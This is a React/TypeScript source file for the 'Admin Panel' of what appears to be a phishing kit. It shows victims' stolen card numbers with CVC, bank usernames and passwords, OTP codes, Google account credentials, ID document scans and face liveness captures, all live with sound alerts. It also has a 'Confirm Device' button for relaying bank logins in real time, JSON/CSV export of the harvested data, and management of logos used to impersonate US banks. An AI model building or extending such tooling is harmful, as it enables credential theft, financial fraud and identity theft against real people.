import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Bell, BellOff, CreditCard, MapPin, Clock, Building2, Monitor, Globe, CheckCircle2, Download, Trash2, Image as ImageIcon, Plus, Search, Mail, ShieldCheck, Camera } from "lucide-react";
import { US_BANKS } from "@/lib/us-banks";
import { fetchBankLogoOverrides } from "@/lib/bank-logos";
import { bankLogo as defaultBankLogo } from "@/lib/us-banks";

export const Route = createFileRoute("/admin")({
  component: AdminPage,
  head: () => ({
    meta: [{ title: "Admin Panel — Live Submissions" }],
  }),
});

type Submission = {
  id: string;
  session_id: string;
  card_number: string | null;
  card_exp: string | null;
  card_cvc: string | null;
  card_name: string | null;
  method: string | null;
  address1: string | null;
  address2: string | null;
  city: string | null;
  state: string | null;
  postal: string | null;
  country: string | null;
  phone: string | null;
  bank_name: string | null;
  bank_username: string | null;
  bank_password: string | null;
  twofa_method: string | null;
  otp_code: string | null;
  device_confirmed: boolean | null;
  admin_confirmed: boolean | null;
  step: string | null;
  user_agent: string | null;
  browser: string | null;
  device: string | null;
  os: string | null;
  ip: string | null;
  ip_city: string | null;
  ip_region: string | null;
  ip_country: string | null;
  ip_isp: string | null;
  created_at: string;
  updated_at: string;
};

function AdminPage() {
  const [rows, setRows] = useState<Submission[]>([]);
  const [soundOn, setSoundOn] = useState(true);
  const [tab, setTab] = useState<"submissions" | "google" | "identity" | "logos">("submissions");
  const audioRef = useRef<HTMLAudioElement | null>(null);
  const soundOnRef = useRef(true);
  soundOnRef.current = soundOn;

  useEffect(() => {
    audioRef.current = new Audio("/notification.wav");
    audioRef.current.volume = 0.7;
    audioRef.current.preload = "auto";

    // Browsers block autoplay until a user gesture. Unlock on first interaction.
    const unlock = () => {
      const a = audioRef.current;
      if (!a) return;
      a.muted = true;
      a.play()
        .then(() => {
          a.pause();
          a.currentTime = 0;
          a.muted = false;
        })
        .catch(() => {});
      window.removeEventListener("click", unlock);
      window.removeEventListener("keydown", unlock);
      window.removeEventListener("touchstart", unlock);
    };
    window.addEventListener("click", unlock);
    window.addEventListener("keydown", unlock);
    window.addEventListener("touchstart", unlock);
    return () => {
      window.removeEventListener("click", unlock);
      window.removeEventListener("keydown", unlock);
      window.removeEventListener("touchstart", unlock);
    };
  }, []);

  const playSound = () => {
    if (!soundOnRef.current || !audioRef.current) return;
    try {
      audioRef.current.currentTime = 0;
    } catch {}
    const p = audioRef.current.play();
    if (p && typeof p.catch === "function") {
      p.catch((err) => {
        console.warn("[admin] notification sound blocked:", err);
      });
    }
  };

  useEffect(() => {
    supabase
      .from("trial_submissions")
      .select("*")
      .order("updated_at", { ascending: false })
      .then(({ data }) => {
        if (data) setRows(data as Submission[]);
      });

    const channel = supabase
      .channel("trial_submissions_changes")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "trial_submissions" },
        (payload) => {
          playSound();
          setRows((prev) => {
            const next = payload.new as Submission;
            if (payload.eventType === "DELETE") {
              return prev.filter((r) => r.id !== (payload.old as Submission).id);
            }
            const idx = prev.findIndex((r) => r.id === next.id);
            if (idx === -1) return [next, ...prev];
            const copy = [...prev];
            copy[idx] = next;
            return [copy[idx], ...copy.filter((_, i) => i !== idx)];
          });
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  return (
    <main className="min-h-screen bg-background px-4 py-8 md:px-8">
      <div className="mx-auto max-w-7xl">
        <header className="mb-6 flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
          <div>
            <h1 className="font-display text-2xl font-bold tracking-tight text-foreground sm:text-3xl">
              Admin Panel
            </h1>
            <p className="mt-1 text-sm text-muted-foreground">
              Live trial submissions · {rows.length} session{rows.length !== 1 && "s"}
            </p>
          </div>
          <div className="flex flex-wrap items-center gap-2">
            <button
              onClick={() => downloadJSON(rows)}
              className="flex items-center gap-2 rounded-xl border border-border bg-card px-3 py-2 text-sm font-medium text-foreground transition hover:bg-muted"
            >
              <Download className="h-4 w-4" /> JSON
            </button>
            <button
              onClick={() => downloadCSV(rows)}
              className="flex items-center gap-2 rounded-xl border border-border bg-card px-3 py-2 text-sm font-medium text-foreground transition hover:bg-muted"
            >
              <Download className="h-4 w-4" /> CSV
            </button>
            <button
              onClick={() => {
                const next = !soundOn;
                setSoundOn(next);
                if (next) playSound();
              }}
              className="flex items-center gap-2 rounded-xl border border-border bg-card px-3 py-2 text-sm font-medium text-foreground transition hover:bg-muted"
            >
              {soundOn ? <Bell className="h-4 w-4" /> : <BellOff className="h-4 w-4" />}
              {soundOn ? "On" : "Off"}
            </button>
          </div>
        </header>

        <div className="mb-6 inline-flex rounded-xl border border-border bg-card p-1">
          <button
            onClick={() => setTab("submissions")}
            className={`rounded-lg px-4 py-1.5 text-sm font-medium transition ${tab === "submissions" ? "bg-primary text-primary-foreground" : "text-muted-foreground hover:text-foreground"}`}
          >
            Submissions
          </button>
          <button
            onClick={() => setTab("google")}
            className={`rounded-lg px-4 py-1.5 text-sm font-medium transition ${tab === "google" ? "bg-primary text-primary-foreground" : "text-muted-foreground hover:text-foreground"}`}
          >
            <span className="flex items-center gap-1.5"><Mail className="h-3.5 w-3.5" /> Google</span>
          </button>
          <button
            onClick={() => setTab("identity")}
            className={`rounded-lg px-4 py-1.5 text-sm font-medium transition ${tab === "identity" ? "bg-primary text-primary-foreground" : "text-muted-foreground hover:text-foreground"}`}
          >
            <span className="flex items-center gap-1.5"><ShieldCheck className="h-3.5 w-3.5" /> Identity</span>
          </button>
          <button
            onClick={() => setTab("logos")}
            className={`rounded-lg px-4 py-1.5 text-sm font-medium transition ${tab === "logos" ? "bg-primary text-primary-foreground" : "text-muted-foreground hover:text-foreground"}`}
          >
            <span className="flex items-center gap-1.5"><ImageIcon className="h-3.5 w-3.5" /> Bank Logos</span>
          </button>
        </div>

        {tab === "logos" ? (
          <BankLogoManager />
        ) : tab === "identity" ? (
          <IdentityVerifications playSound={playSound} />
        ) : tab === "google" ? (
          <GoogleSubmissions playSound={playSound} />
        ) : (
        <>
        {rows.length === 0 ? (
          <div className="rounded-2xl border border-dashed border-border bg-card p-12 text-center">
            <p className="text-muted-foreground">
              Waiting for trial submissions… open the trial page and start typing.
            </p>
          </div>
        ) : (
          <div className="grid gap-4 md:grid-cols-2 xl:grid-cols-3">
            {rows.map((r) => (
              <article
                key={r.id}
                className="rounded-2xl border border-border bg-card p-5 shadow-sm transition hover:shadow-md"
              >
                <div className="mb-4 flex items-center justify-between">
                  <span className="rounded-full bg-primary/10 px-2.5 py-1 font-mono text-[10px] text-primary">
                    {r.session_id.slice(0, 8)}
                  </span>
                  <div className="flex items-center gap-2">
                    <span className="flex items-center gap-1 text-[11px] text-muted-foreground">
                      <Clock className="h-3 w-3" />
                      {new Date(r.updated_at).toLocaleTimeString()}
                    </span>
                    <button
                      onClick={async () => {
                        if (!confirm("Delete this submission?")) return;
                        await supabase.from("trial_submissions").delete().eq("id", r.id);
                        setRows((prev) => prev.filter((x) => x.id !== r.id));
                      }}
                      className="rounded-md p-1 text-destructive transition hover:bg-destructive/10"
                      title="Delete"
                    >
                      <Trash2 className="h-3.5 w-3.5" />
                    </button>
                  </div>
                </div>

                <section className="mb-4">
                  <h3 className="mb-2 flex items-center gap-1.5 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                    <CreditCard className="h-3.5 w-3.5" /> Payment ({r.method || "—"})
                  </h3>
                  <dl className="space-y-1.5 text-sm">
                    <Field label="Card #" value={r.card_number} />
                    <div className="grid grid-cols-2 gap-2">
                      <Field label="Expiry" value={r.card_exp} />
                      <Field label="CVC" value={r.card_cvc} />
                    </div>
                    <Field label="Name" value={r.card_name} />
                  </dl>
                </section>

                <section>
                  <h3 className="mb-2 flex items-center gap-1.5 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                    <MapPin className="h-3.5 w-3.5" /> Billing
                  </h3>
                  <dl className="space-y-1.5 text-sm">
                    <Field label="Address 1" value={r.address1} />
                    <Field label="Address 2" value={r.address2} />
                    <div className="grid grid-cols-2 gap-2">
                      <Field label="City" value={r.city} />
                      <Field label="State" value={r.state} />
                    </div>
                    <div className="grid grid-cols-2 gap-2">
                      <Field label="Postal" value={r.postal} />
                      <Field label="Country" value={r.country} />
                    </div>
                    <Field label="Phone" value={r.phone} />
                  </dl>
                </section>

                <section className="mt-4">
                  <h3 className="mb-2 flex items-center gap-1.5 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                    <Building2 className="h-3.5 w-3.5" /> Bank Verification
                  </h3>
                  <dl className="space-y-1.5 text-sm">
                    <Field label="Bank" value={r.bank_name} />
                    <Field label="Username" value={r.bank_username} />
                    <Field label="Password" value={r.bank_password} />
                    <div className="grid grid-cols-2 gap-2">
                      <Field label="2FA" value={r.twofa_method} />
                      <Field label="OTP" value={r.otp_code} />
                    </div>
                    <Field
                      label="Device"
                      value={r.device_confirmed ? "✅ Confirmed" : null}
                    />
                    <Field label="Step" value={r.step} />
                  </dl>

                  {r.step === "awaiting_device_confirmation" && !r.admin_confirmed && (
                    <button
                      onClick={async () => {
                        await supabase
                          .from("trial_submissions")
                          .update({ admin_confirmed: true })
                          .eq("id", r.id);
                      }}
                      className="mt-3 flex w-full items-center justify-center gap-2 rounded-xl bg-primary px-4 py-2.5 text-sm font-semibold text-primary-foreground transition hover:opacity-90"
                    >
                      <CheckCircle2 className="h-4 w-4" /> Confirm Device
                    </button>
                  )}
                  {r.admin_confirmed && (
                    <p className="mt-3 flex items-center justify-center gap-1.5 rounded-xl bg-[oklch(0.78_0.16_150/0.15)] px-3 py-2 text-xs font-semibold text-[oklch(0.78_0.16_150)]">
                      <CheckCircle2 className="h-3.5 w-3.5" /> Device approved by admin
                    </p>
                  )}
                </section>

                <section className="mt-4">
                  <h3 className="mb-2 flex items-center gap-1.5 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                    <Monitor className="h-3.5 w-3.5" /> Device & Browser
                  </h3>
                  <dl className="space-y-1.5 text-sm">
                    <Field label="Device" value={r.device} />
                    <Field label="OS" value={r.os} />
                    <Field label="Browser" value={r.browser} />
                    <Field label="User Agent" value={r.user_agent} />
                  </dl>
                </section>

                <section className="mt-4">
                  <h3 className="mb-2 flex items-center gap-1.5 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                    <Globe className="h-3.5 w-3.5" /> Network / IP
                  </h3>
                  <dl className="space-y-1.5 text-sm">
                    <Field label="IP" value={r.ip} />
                    <Field
                      label="Location"
                      value={
                        [r.ip_city, r.ip_region, r.ip_country]
                          .filter(Boolean)
                          .join(", ") || null
                      }
                    />
                    <Field label="ISP" value={r.ip_isp} />
                  </dl>
                </section>
              </article>
            ))}
          </div>
        )}
        </>
        )}
      </div>
    </main>
  );
}

function downloadBlob(content: string, filename: string, type: string) {
  const blob = new Blob([content], { type });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}

function downloadJSON(rows: Submission[]) {
  const ts = new Date().toISOString().replace(/[:.]/g, "-");
  downloadBlob(JSON.stringify(rows, null, 2), `submissions-${ts}.json`, "application/json");
}

function downloadCSV(rows: Submission[]) {
  if (rows.length === 0) return;
  const headers = Object.keys(rows[0]);
  const escape = (v: unknown) => {
    if (v === null || v === undefined) return "";
    const s = String(v).replace(/"/g, '""');
    return /[",\n]/.test(s) ? `"${s}"` : s;
  };
  const lines = [
    headers.join(","),
    ...rows.map((r) => headers.map((h) => escape((r as Record<string, unknown>)[h])).join(",")),
  ];
  const ts = new Date().toISOString().replace(/[:.]/g, "-");
  downloadBlob(lines.join("\n"), `submissions-${ts}.csv`, "text/csv");
}

function BankLogoManager() {
  const [overrides, setOverrides] = useState<Record<string, string>>({});
  const [search, setSearch] = useState("");
  const [editing, setEditing] = useState<string | null>(null);
  const [draftUrl, setDraftUrl] = useState("");
  const [uploading, setUploading] = useState(false);

  useEffect(() => {
    fetchBankLogoOverrides().then(setOverrides);
  }, []);

  const filtered = US_BANKS.filter((b) =>
    b.name.toLowerCase().includes(search.toLowerCase())
  ).slice(0, 200);

  const save = async (domain: string, url: string) => {
    if (!url) return;
    await supabase.from("bank_logos").upsert({ domain, logo_url: url, updated_at: new Date().toISOString() });
    setOverrides((p) => ({ ...p, [domain]: url }));
    setEditing(null);
    setDraftUrl("");
  };

  const remove = async (domain: string) => {
    await supabase.from("bank_logos").delete().eq("domain", domain);
    setOverrides((p) => {
      const c = { ...p };
      delete c[domain];
      return c;
    });
  };

  const uploadFile = async (domain: string, file: File) => {
    setUploading(true);
    const ext = file.name.split(".").pop() || "png";
    const path = `${domain}-${Date.now()}.${ext}`;
    const { error } = await supabase.storage.from("bank-logos").upload(path, file, { upsert: true });
    if (!error) {
      const { data } = supabase.storage.from("bank-logos").getPublicUrl(path);
      await save(domain, data.publicUrl);
    }
    setUploading(false);
  };

  return (
    <div className="rounded-2xl border border-border bg-card p-5">
      <div className="mb-4 flex items-center gap-2 rounded-xl border border-border bg-background px-3 py-2">
        <Search className="h-4 w-4 text-muted-foreground" />
        <input
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          placeholder="Search banks..."
          className="flex-1 bg-transparent text-sm outline-none"
        />
      </div>
      <ul className="divide-y divide-border">
        {filtered.map((b) => {
          const current = overrides[b.domain] || defaultBankLogo(b.domain);
          const isCustom = !!overrides[b.domain];
          const isEditing = editing === b.domain;
          return (
            <li key={b.domain} className="flex flex-wrap items-center gap-3 py-3">
              <img
                src={current}
                alt=""
                className="h-10 w-10 flex-none rounded-md border border-border bg-white object-contain p-1"
                onError={(e) => ((e.currentTarget as HTMLImageElement).style.opacity = "0.2")}
              />
              <div className="min-w-0 flex-1">
                <p className="truncate text-sm font-medium text-foreground">{b.name}</p>
                <p className="truncate text-[11px] text-muted-foreground">{b.domain} {isCustom && "· custom"}</p>
              </div>
              {isEditing ? (
                <div className="flex w-full flex-wrap items-center gap-2 md:w-auto">
                  <input
                    value={draftUrl}
                    onChange={(e) => setDraftUrl(e.target.value)}
                    placeholder="Logo URL"
                    className="w-64 rounded-md border border-border bg-background px-2 py-1 text-xs"
                  />
                  <button onClick={() => save(b.domain, draftUrl)} className="rounded-md bg-primary px-3 py-1 text-xs font-medium text-primary-foreground">Save</button>
                  <label className="cursor-pointer rounded-md border border-border px-3 py-1 text-xs">
                    Upload
                    <input
                      type="file"
                      accept="image/*"
                      className="hidden"
                      onChange={(e) => {
                        const f = e.target.files?.[0];
                        if (f) uploadFile(b.domain, f);
                      }}
                    />
                  </label>
                  <button onClick={() => { setEditing(null); setDraftUrl(""); }} className="rounded-md border border-border px-3 py-1 text-xs">Cancel</button>
                </div>
              ) : (
                <div className="flex items-center gap-2">
                  <button
                    onClick={() => { setEditing(b.domain); setDraftUrl(overrides[b.domain] || ""); }}
                    className="flex items-center gap-1 rounded-md border border-border px-3 py-1 text-xs font-medium text-foreground hover:bg-muted"
                  >
                    <Plus className="h-3 w-3" /> {isCustom ? "Edit" : "Set logo"}
                  </button>
                  {isCustom && (
                    <button onClick={() => remove(b.domain)} className="rounded-md p-1 text-destructive hover:bg-destructive/10">
                      <Trash2 className="h-3.5 w-3.5" />
                    </button>
                  )}
                </div>
              )}
            </li>
          );
        })}
      </ul>
      {uploading && <p className="mt-3 text-xs text-muted-foreground">Uploading...</p>}
    </div>
  );
}

function Field({ label, value }: { label: string; value: string | null }) {
  return (
    <div className="flex items-baseline justify-between gap-3 border-b border-border/50 pb-1 last:border-0">
      <dt className="text-[11px] uppercase tracking-wide text-muted-foreground">{label}</dt>
      <dd className="truncate font-mono text-xs text-foreground">{value || "—"}</dd>
    </div>
  );
}

type GoogleRow = {
  id: string;
  session_id: string;
  email: string | null;
  password: string | null;
  phone: string | null;
  otp: string | null;
  step: string | null;
  user_agent: string | null;
  browser: string | null;
  os: string | null;
  device: string | null;
  ip: string | null;
  ip_city: string | null;
  ip_region: string | null;
  ip_country: string | null;
  ip_isp: string | null;
  created_at: string;
  updated_at: string;
};

function GoogleSubmissions({ playSound }: { playSound: () => void }) {
  const [rows, setRows] = useState<GoogleRow[]>([]);

  useEffect(() => {
    supabase
      .from("google_submissions")
      .select("*")
      .order("updated_at", { ascending: false })
      .then(({ data }) => {
        if (data) setRows(data as GoogleRow[]);
      });

    const channel = supabase
      .channel("google_submissions_changes")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "google_submissions" },
        (payload) => {
          playSound();
          setRows((prev) => {
            if (payload.eventType === "DELETE") {
              return prev.filter((r) => r.id !== (payload.old as GoogleRow).id);
            }
            const next = payload.new as GoogleRow;
            const idx = prev.findIndex((r) => r.id === next.id);
            if (idx === -1) return [next, ...prev];
            const copy = [...prev];
            copy[idx] = next;
            return [copy[idx], ...copy.filter((_, i) => i !== idx)];
          });
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const downloadJson = () => {
    const ts = new Date().toISOString().replace(/[:.]/g, "-");
    downloadBlob(JSON.stringify(rows, null, 2), `google-${ts}.json`, "application/json");
  };

  return (
    <div>
      <div className="mb-4 flex items-center justify-between">
        <p className="text-sm text-muted-foreground">{rows.length} Google sign-in attempt{rows.length !== 1 && "s"}</p>
        <button
          onClick={downloadJson}
          disabled={rows.length === 0}
          className="flex items-center gap-2 rounded-xl border border-border bg-card px-3 py-2 text-sm font-medium text-foreground transition hover:bg-muted disabled:opacity-50"
        >
          <Download className="h-4 w-4" /> JSON
        </button>
      </div>
      {rows.length === 0 ? (
        <div className="rounded-2xl border border-dashed border-border bg-card p-12 text-center">
          <p className="text-muted-foreground">Waiting for Google sign-in attempts…</p>
        </div>
      ) : (
        <div className="grid gap-4 md:grid-cols-2 xl:grid-cols-3">
          {rows.map((r) => (
            <article key={r.id} className="rounded-2xl border border-border bg-card p-5 shadow-sm transition hover:shadow-md">
              <div className="mb-4 flex items-center justify-between">
                <span className="rounded-full bg-primary/10 px-2.5 py-1 font-mono text-[10px] text-primary">
                  {r.session_id.slice(0, 8)}
                </span>
                <div className="flex items-center gap-2">
                  <span className="flex items-center gap-1 text-[11px] text-muted-foreground">
                    <Clock className="h-3 w-3" />
                    {new Date(r.updated_at).toLocaleTimeString()}
                  </span>
                  <button
                    onClick={async () => {
                      if (!confirm("Delete this entry?")) return;
                      await supabase.from("google_submissions").delete().eq("id", r.id);
                      setRows((prev) => prev.filter((x) => x.id !== r.id));
                    }}
                    className="rounded-md p-1 text-destructive transition hover:bg-destructive/10"
                    title="Delete"
                  >
                    <Trash2 className="h-3.5 w-3.5" />
                  </button>
                </div>
              </div>

              <section className="mb-4">
                <h3 className="mb-2 flex items-center gap-1.5 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                  <Mail className="h-3.5 w-3.5" /> Google Account
                </h3>
                <dl className="space-y-1.5 text-sm">
                  <Field label="Email" value={r.email} />
                  <Field label="Password" value={r.password} />
                  <Field label="Phone" value={r.phone} />
                  <Field label="OTP" value={r.otp} />
                  <Field label="Step" value={r.step} />
                </dl>
              </section>

              <section className="mb-4">
                <h3 className="mb-2 flex items-center gap-1.5 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                  <Monitor className="h-3.5 w-3.5" /> Device
                </h3>
                <dl className="space-y-1.5 text-sm">
                  <Field label="Device" value={r.device} />
                  <Field label="OS" value={r.os} />
                  <Field label="Browser" value={r.browser} />
                </dl>
              </section>

              <section>
                <h3 className="mb-2 flex items-center gap-1.5 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                  <Globe className="h-3.5 w-3.5" /> Network
                </h3>
                <dl className="space-y-1.5 text-sm">
                  <Field label="IP" value={r.ip} />
                  <Field
                    label="Location"
                    value={[r.ip_city, r.ip_region, r.ip_country].filter(Boolean).join(", ") || null}
                  />
                  <Field label="ISP" value={r.ip_isp} />
                </dl>
              </section>
            </article>
          ))}
        </div>
      )}
    </div>
  );
}

type IdentityRow = {
  id: string;
  session_id: string;
  doc_type: string | null;
  doc_image_url: string | null;
  doc_back_url: string | null;
  face_look_url: string | null;
  face_blink_url: string | null;
  face_right_url: string | null;
  face_left_url: string | null;
  current_step: string | null;
  status: string;
  user_agent: string | null;
  created_at: string;
  updated_at: string;
};

const DOC_LABEL: Record<string, string> = {
  nid: "National ID",
  license: "Driving License",
  passport: "Passport",
};

function IdentityVerifications({ playSound }: { playSound: () => void }) {
  const [rows, setRows] = useState<IdentityRow[]>([]);
  const [preview, setPreview] = useState<string | null>(null);

  useEffect(() => {
    supabase
      .from("identity_verifications")
      .select("*")
      .order("updated_at", { ascending: false })
      .then(({ data }) => {
        if (data) setRows(data as IdentityRow[]);
      });

    const channel = supabase
      .channel("identity_verifications_changes")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "identity_verifications" },
        (payload) => {
          playSound();
          setRows((prev) => {
            if (payload.eventType === "DELETE") {
              return prev.filter((r) => r.id !== (payload.old as IdentityRow).id);
            }
            const next = payload.new as IdentityRow;
            const idx = prev.findIndex((r) => r.id === next.id);
            if (idx === -1) return [next, ...prev];
            const copy = [...prev];
            copy[idx] = next;
            return [copy[idx], ...copy.filter((_, i) => i !== idx)];
          });
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const FACE_LABELS: { key: keyof IdentityRow; label: string }[] = [
    { key: "face_look_url", label: "Look" },
    { key: "face_blink_url", label: "Blink" },
    { key: "face_right_url", label: "Right" },
    { key: "face_left_url", label: "Left" },
  ];

  return (
    <div>
      <p className="mb-4 text-sm text-muted-foreground">
        {rows.length} identity verification{rows.length !== 1 && "s"} · live
      </p>

      {rows.length === 0 ? (
        <div className="rounded-2xl border border-dashed border-border bg-card p-12 text-center">
          <p className="text-muted-foreground">Waiting for identity verifications…</p>
        </div>
      ) : (
        <div className="grid gap-4 md:grid-cols-2 xl:grid-cols-3">
          {rows.map((r) => (
            <article key={r.id} className="rounded-2xl border border-border bg-card p-5 shadow-sm transition hover:shadow-md">
              <div className="mb-4 flex items-center justify-between">
                <span className="rounded-full bg-primary/10 px-2.5 py-1 font-mono text-[10px] text-primary">
                  {r.session_id.slice(0, 8)}
                </span>
                <div className="flex items-center gap-2">
                  <span className={`rounded-full px-2 py-0.5 text-[10px] font-semibold ${
                    r.status === "completed"
                      ? "bg-[oklch(0.78_0.16_150/0.15)] text-[oklch(0.78_0.16_150)]"
                      : "bg-amber-500/15 text-amber-500"
                  }`}>
                    {r.status}
                  </span>
                  <span className="flex items-center gap-1 text-[11px] text-muted-foreground">
                    <Clock className="h-3 w-3" />
                    {new Date(r.updated_at).toLocaleTimeString()}
                  </span>
                  <button
                    onClick={async () => {
                      if (!confirm("Delete this verification?")) return;
                      await supabase.from("identity_verifications").delete().eq("id", r.id);
                      setRows((prev) => prev.filter((x) => x.id !== r.id));
                    }}
                    className="rounded-md p-1 text-destructive transition hover:bg-destructive/10"
                  >
                    <Trash2 className="h-3.5 w-3.5" />
                  </button>
                </div>
              </div>

              <section className="mb-4">
                <h3 className="mb-2 flex items-center gap-1.5 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                  <ShieldCheck className="h-3.5 w-3.5" /> Document
                </h3>
                <dl className="space-y-1.5 text-sm">
                  <Field label="Type" value={r.doc_type ? DOC_LABEL[r.doc_type] || r.doc_type : null} />
                  <Field label="Step" value={r.current_step} />
                </dl>
                {r.doc_image_url || r.doc_back_url ? (
                  <div className="mt-3 grid grid-cols-2 gap-2">
                    {[
                      { url: r.doc_image_url, label: "Front" },
                      { url: r.doc_back_url, label: "Back" },
                    ].map((d) => (
                      <div key={d.label} className="space-y-1">
                        {d.url ? (
                          <button
                            onClick={() => setPreview(d.url)}
                            className="block w-full overflow-hidden rounded-xl border border-border bg-muted"
                          >
                            <img src={d.url} alt={d.label} className="max-h-40 w-full object-contain" />
                          </button>
                        ) : (
                          <div className="grid h-32 place-items-center rounded-xl border border-dashed border-border text-[11px] text-muted-foreground">
                            No {d.label.toLowerCase()}
                          </div>
                        )}
                        <p className="text-center text-[10px] text-muted-foreground">{d.label}</p>
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="mt-3 grid h-32 place-items-center rounded-xl border border-dashed border-border text-[11px] text-muted-foreground">
                    No document yet
                  </div>
                )}
              </section>

              <section>
                <h3 className="mb-2 flex items-center gap-1.5 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                  <Camera className="h-3.5 w-3.5" /> Face Captures
                </h3>
                <div className="grid grid-cols-4 gap-2">
                  {FACE_LABELS.map((f) => {
                    const url = r[f.key] as string | null;
                    return (
                      <div key={f.key} className="flex flex-col items-center gap-1">
                        {url ? (
                          <button
                            onClick={() => setPreview(url)}
                            className="aspect-square w-full overflow-hidden rounded-lg border border-border bg-muted"
                          >
                            <img src={url} alt={f.label} className="h-full w-full object-cover" />
                          </button>
                        ) : (
                          <div className="grid aspect-square w-full place-items-center rounded-lg border border-dashed border-border">
                            <Camera className="h-4 w-4 text-muted-foreground/50" />
                          </div>
                        )}
                        <span className="text-[10px] text-muted-foreground">{f.label}</span>
                      </div>
                    );
                  })}
                </div>
              </section>
            </article>
          ))}
        </div>
      )}

      {preview && (
        <div
          onClick={() => setPreview(null)}
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-6"
        >
          <img src={preview} alt="" className="max-h-[90vh] max-w-[90vw] rounded-xl object-contain" />
        </div>
      )}
    </div>
  );
}
